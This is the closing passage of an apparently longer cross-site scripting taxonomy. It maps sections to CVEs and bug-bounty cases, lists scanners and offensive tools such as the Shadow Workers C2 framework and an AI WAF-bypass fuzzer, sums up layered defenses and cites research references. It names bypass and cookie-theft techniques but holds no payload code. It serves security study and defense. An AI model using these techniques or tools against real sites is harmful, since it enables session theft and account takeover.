| §6-1 (DOM clobbering → bundler) | CVE-2024-47068 (Rollup) | `import.meta.url` clobbering in bundled scripts; npm supply chain impact |
| §9-2 (Markdown link injection) | CVE-2025-24981 (Nuxt MDC) | XSS via HTML-entity-encoded `javascript:` in markdown link URLs |
| §9-2 (Markdown to JSX) | CVE-2024-21535 (markdown-to-jsx) | XSS via malicious iframe in markdown `src` property |
| §2-3 (Stored XSS in PAN-OS) | CVE-2024-5920 (Palo Alto PAN-OS) | Admin impersonation via stored XSS pushed from Panorama |
| §10-1 (CRLF to XSS) | CVE-2024-52875 (GFI KerioControl) | CRLF injection in `dest` parameter; 1-click RCE chain |
| §6-3 (postMessage to XSS) | CVE-2024-49038 (Microsoft Copilot Studio) | CVSS 9.3; missing origin validation enables token theft |
| §9-1 (Vue template XSS) | CVE-2024-6783 (vue-template-compiler) | Prototype pollution enables XSS in Vue 2.x template compiler |
| §6-3 (postMessage chain) | ZoomInfo Chat (July 2024) | Two-stage: token leakage via `postMessage('*')` + DOM XSS |
| §6-3 (postMessage ATO) | Meta Conversion API Gateway (Jan 2025) | Zero-click account takeover via unvalidated postMessage origin. $12,500 bounty |
| §10-2 (Cookie sandwich) | Apache Tomcat (2025 research) | HttpOnly cookie theft via RFC2109 parsing switch; phantom `$Version` cookie |
| §8-3 (Parameter pollution) | WAF bypass research (2024) | 14 of 17 major WAF configurations bypassed (AWS, GCP, Azure, Cloudflare) |

---

## Detection Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **XSStrike** (Scanner) | Reflected, DOM, Blind XSS | Intelligent fuzzing with browser-engine verification; multi-parser payload generation |
| **Burp Suite Scanner** (Commercial) | All XSS types | Crawl-and-audit with DOM analysis; passive/active scanning |
| **DOM Invader** (Burp Extension) | DOM XSS, Prototype Pollution | Automated DOM source-to-sink analysis; prototype pollution gadget scanner |
| **XSS Hunter** (Blind XSS) | Blind/Stored XSS | Out-of-band payload reporting with screenshots and DOM snapshots |
| **DOMPurify** (Sanitizer) | mXSS, HTML injection | Server/client-side HTML sanitization; regularly updated mutation rules |
| **Trusted Types** (Browser API) | DOM XSS | Browser-enforced policy requiring sanitized types for DOM sinks |
| **xssFuzz** (Fuzzer) | WAF bypass, CSP misconfig | Tag/attribute fuzzing; CSP configuration analysis |
| **XSSGAI** (AI Fuzzer) | WAF bypass | ML-generated adversarial payloads; 80% bypass rate against SOTA WAFs |
| **Shadow Workers** (C2) | XSS post-exploitation | Service worker-based persistence and proxying framework |
| **Knoxss** (AI Scanner) | All XSS types | AI-powered automated deep scanning; minimal configuration |
| **CSP Evaluator** (Google) | CSP configuration | Static analysis of Content Security Policy for bypass-prone directives |
| **RetireJS** (Library Scanner) | Known vulnerable libraries | Detects outdated JS libraries with known XSS vulnerabilities |
| **Semgrep** (SAST) | Source code XSS patterns | Static analysis rules for `innerHTML`, `eval`, `dangerouslySetInnerHTML`, etc. |

---

## Summary: Core Principles

**Why XSS persists.** Cross-site scripting is fundamentally an injection problem arising from the web's core design: HTML, CSS, and JavaScript coexist in a single document parsed by a pipeline of context-dependent interpreters. Every transition between parsing contexts — HTML to attribute, attribute to URL, URL to JavaScript, serialized DOM to live DOM — creates an opportunity for attacker-controlled input to cross a trust boundary. Unlike SQL injection, which can be structurally eliminated through parameterized queries, XSS has no single architectural solution because the injection surface is distributed across every layer of the browser's rendering pipeline.

**Why incremental fixes fail.** Each defense addresses one layer while leaving others exposed. Output encoding prevents §1 and §2 but not §3 (JavaScript context) or §6 (DOM APIs). Content Security Policy blocks inline scripts but can be bypassed via JSONP endpoints (§4), nonce leakage (§5-2), or base tag injection (§1-3). HTML sanitizers like DOMPurify prevent direct injection but are systematically defeated by mutation XSS (§7) — a category that exists precisely because sanitizers and browsers implement different HTML parsing algorithms. WAFs operate on raw HTTP and cannot model the browser's multi-stage parsing pipeline, making them fundamentally unable to distinguish malicious from benign payloads in context (§8). The addition of Trusted Types (§6) and Sanitizer API shows progress, but adoption remains limited, and both require significant application-level integration.

**What structural defense looks like.** True XSS elimination requires defense at every pipeline stage simultaneously: (1) context-aware output encoding at the template level (not manual escaping), (2) strict CSP with nonce-per-request and no `unsafe-inline`, (3) Trusted Types enforcement to eliminate DOM XSS sinks, (4) `X-Content-Type-Options: nosniff` to prevent MIME confusion, (5) `HttpOnly`, `Secure`, `SameSite` cookie attributes to limit post-exploitation impact, and (6) input validation at the semantic level (not pattern matching). Frameworks that implement these by default (auto-escaping templates, Trusted Types integration, built-in CSP) represent the most promising path forward — but even they cannot protect against all categories in this taxonomy, particularly mutation XSS (§7) and prototype pollution gadgets (§6-2), which exploit the gap between what any single component considers "safe" and what the browser ultimately executes.

---

## References

- PortSwigger Research. "Cross-Site Scripting (XSS) Cheat Sheet — 2026 Edition." https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- PortSwigger Research. "Bypassing DOMPurify again with mutation XSS." https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss
- PortSwigger Research. "Stealing HttpOnly cookies with the cookie sandwich technique." https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique
- PortSwigger Research. "Bypassing WAFs with the phantom $Version cookie." https://portswigger.net/research/bypassing-wafs-with-the-phantom-version-cookie
- PortSwigger Research. "Cookie Chaos: How to bypass __Host and __Secure cookie prefixes." https://portswigger.net/research/cookie-chaos-how-to-bypass-host-and-secure-cookie-prefixes
- PortSwigger Research. "Exploiting XSS in hidden inputs and meta tags." https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags
- PortSwigger Research. "SVG animate XSS vector." https://portswigger.net/research/svg-animate-xss-vector
- PortSwigger Research. "Hijacking service workers via DOM Clobbering." https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering
- PortSwigger Research. "Evading CSP with DOM-based dangling markup." https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup
- PortSwigger Research. "New exotic events in the XSS cheat sheet." https://portswigger.net/research/new-exotic-events-in-the-xss-cheat-sheet
- Mizu.re. "Exploring the DOMPurify library: Bypasses and Fixes." https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes
- Securitum Research. "Mutation XSS via namespace confusion — DOMPurify < 2.0.17 bypass." https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/
- BeaconRed Research. "When Purification Fails: Exploiting DOMPurify's Leftovers." https://shaheen.beaconred.net/research/2025/05/28/when-purification-fails.html
- CVE News. "CVE-2024-47875 — Breaking Down the DOMPurify mXSS Vulnerability." https://www.cve.news/cve-2024-47875/
- CVE News. "CVE-2025-26791 — Exploiting DOMPurify's Regular Expression Bug for mXSS." https://www.cve.news/cve-2025-26791/
- GitHub Advisory. "Webpack AutoPublicPathRuntimeModule DOM Clobbering XSS (GHSA-4vvj-4cpr-p986)." https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
- GitHub Advisory. "Astro client-side router DOM Clobbering XSS (CVE-2024-47885)." https://advisories.gitlab.com/pkg/npm/astro/CVE-2024-47885/
- Buer.haus. "Go Go XSS Gadgets: Chaining a DOM Clobbering Exploit in the Wild." https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/
- USENIX Security 2025. "The DOMino Effect: Detecting and Exploiting DOM Clobbering Gadgets." https://www.usenix.org/system/files/conference/usenixsecurity25/sec25cycle1-prepub-858-liu-zhengyu.pdf
- Ethiack Blog. "Bypassing WAFs for Fun and JS Injection with Parameter Pollution." https://blog.ethiack.com/blog/bypassing-wafs-for-fun-and-js-injection-with-parameter-pollution
- TrustedSec. "Persistence Through Service Workers." https://trustedsec.com/blog/persistence-through-service-workers-part-1-introduction-and-target-application-setup
- Shadow Workers Project. https://shadow-workers.github.io/
- Akamai Blog. "Abusing the Service Workers API." https://www.akamai.com/blog/security/abusing-the-service-workers-api
- Microsoft MSRC. "Weaponizing cross site scripting: When one bug isn't enough." https://www.microsoft.com/en-us/msrc/blog/2025/11/weaponizing-cross-site-scripting-when-one-bug-isnt-enough
- Microsoft MSRC. "PostMessaged and Compromised." https://www.microsoft.com/en-us/msrc/blog/2025/08/postmessaged-and-compromised
- Youssef Sammouda. "Multiple XSS in Meta Conversion API Gateway Leading to Zero-Click Account Takeover." https://ysamm.com/uncategorized/2025/01/13/capig-xss.html
- Bugcrowd Blog. "The guide to blind XSS." https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/
- Intigriti Blog. "CSP Bypasses: Advanced Exploitation Guide." https://www.intigriti.com/researchers/blog/hacking-tools/content-security-policy-csp-bypasses
- Node.js Security. "How I found an XSS in the Nuxt MDC Library for Markdown Content." https://www.nodejs-security.com/blog/nuxt-mdc-xss-vulnerability
- W3C Blog. "How to protect your Web applications from XSS (2025)." https://www.w3.org/blog/2025/how-to-protect-your-web-applications-from-xss/
- The Hacker News. "Why React Didn't Kill XSS: The New JavaScript Injection Playbook." https://thehackernews.com/2025/07/why-react-didnt-kill-xss-new-javascript.html
- BroadChannel. "XSSGAI and AI-Generated XSS: Why Traditional WAF Rules Are Obsolete in 2025." https://broadchannel.org/xssgai-ai-generated-xss-waf-bypass/
- OWASP. "XSS Filter Evasion Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
- OWASP. "DOM Clobbering Prevention Cheat Sheet." https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
- HackTricks. "Cross Site Scripting (XSS)." https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting

---

*This document was created for defensive security research and vulnerability understanding purposes.*
